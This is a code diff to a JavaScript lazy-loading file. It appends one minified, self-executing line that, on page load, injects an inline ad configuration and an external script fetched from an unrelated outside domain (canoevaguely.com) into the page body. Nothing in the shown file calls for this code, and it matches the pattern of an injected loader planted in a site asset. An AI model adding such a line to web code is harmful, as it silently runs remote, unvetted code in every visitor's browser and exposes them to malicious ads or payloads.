@@ -150,4 +150,5 @@ dataLazy.forEach(function(a){
     };
   };
 });
+(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n\tatOptions = {\n\t\t'key' : '913bbd336ece87c3f5ba8696a10155e5',\n\t\t'format' : 'iframe',\n\t\t'height' : 250,\n\t\t'width' : 300,\n\t\t'params' : {}\n\t};\t\n"},{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"https://canoevaguely.com/913bbd336ece87c3f5ba8696a10155e5/invoke.js"}],"tag":"script","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
 
